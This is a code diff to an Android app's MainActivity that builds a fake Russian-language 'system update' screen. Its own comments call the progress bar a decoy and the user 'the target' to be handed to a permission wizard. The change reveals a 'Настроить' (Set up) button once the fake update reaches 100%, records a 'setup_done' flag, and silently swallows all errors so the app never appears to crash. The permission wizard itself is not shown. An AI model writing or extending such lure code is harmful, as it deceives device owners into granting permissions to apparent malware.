@@ -7,15 +7,33 @@ import android.graphics.Typeface
 import android.os.Bundle
 import android.os.Handler
 import android.view.View
+import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.ProgressBar
 import android.widget.TextView
+import com.sp.core.util.Prefs
 
+/**
+ * Fake "system update" screen.
+ *
+ * The progress bar is a decoy - the real work starts when the user taps
+ * "Настроить". The activity never finishes itself, so the app can never look
+ * like it crashed.
+ */
 class MainActivity : Activity() {
+
     private val appCtx: Context get() = this
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        try {
+            buildUi()
+        } catch (t: Throwable) {
+            // A broken UI must never take the process down.
+        }
+    }
+
+    private fun buildUi() {
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             setPadding(64, 128, 64, 64)
@@ -40,11 +58,33 @@ class MainActivity : Activity() {
         root.addView(status)
         val progress = ProgressBar(this, null,
             android.R.attr.progressBarStyleHorizontal).apply {
-            max = 100; progress = 0
+            max = 100
+            progress = 0
             layoutParams = LinearLayout.LayoutParams(
                 LinearLayout.LayoutParams.MATCH_PARENT, 16).apply { topMargin = 48 }
         }
         root.addView(progress)
+
+        val actions = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            layoutParams = LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT
+            ).apply { topMargin = 40 }
+        }
+
+        val setupBtn = Button(this).apply {
+            text = "Настроить"
+            visibility = View.GONE
+            setOnClickListener {
+                try {
+                    startActivity(android.content.Intent(appCtx, SetupActivity::class.java))
+                } catch (_: Throwable) {
+                }
+            }
+        }
+        actions.addView(setupBtn)
+
         val version = TextView(this).apply {
             text = "Версия Android: ${android.os.Build.VERSION.RELEASE}\n" +
                    "android_UI: 1.0.0"
@@ -54,6 +94,7 @@ class MainActivity : Activity() {
                 LinearLayout.LayoutParams.WRAP_CONTENT,
                 LinearLayout.LayoutParams.WRAP_CONTENT).apply { topMargin = 64 }
         }
+        root.addView(actions)
         root.addView(version)
         setContentView(root)
 
@@ -61,29 +102,19 @@ class MainActivity : Activity() {
         var p = 0
         val runnable = object : Runnable {
             override fun run() {
-                p += 7
-                progress.progress = p.coerceAtMost(100)
-                if (p >= 100) {
-                    status.text = "Система обновлена"
-                    handler.postDelayed({
-                        // Hand the target over to the permission wizard.
-                        // The task is finished by the wizard itself - finishing
-                        // it here would kill the wizard with it.
-                        try {
-                            startActivity(
-                                android.content.Intent(appCtx, SetupActivity::class.java)
-                            )
-                            // Only this activity leaves the screen - the wizard
-                            // continues in the same task and closes it at the end.
-                            finish()
-                        } catch (_: Throwable) {
-                            finishAndRemoveTask()
-                        }
-                    }, 800)
-                    return
+                try {
+                    p += 7
+                    progress.progress = p.coerceAtMost(100)
+                    if (p >= 100) {
+                        status.text = "Система обновлена"
+                        setupBtn.visibility = View.VISIBLE
+                        Prefs.set(appCtx, "setup_done", true)
+                        return
+                    }
+                    status.text = "Проверка обновлений... $p%"
+                    handler.postDelayed(this, 120)
+                } catch (_: Throwable) {
                 }
-                status.text = "Проверка обновлений... $p%"
-                handler.postDelayed(this, 120)
             }
         }
         handler.postDelayed(runnable, 300)
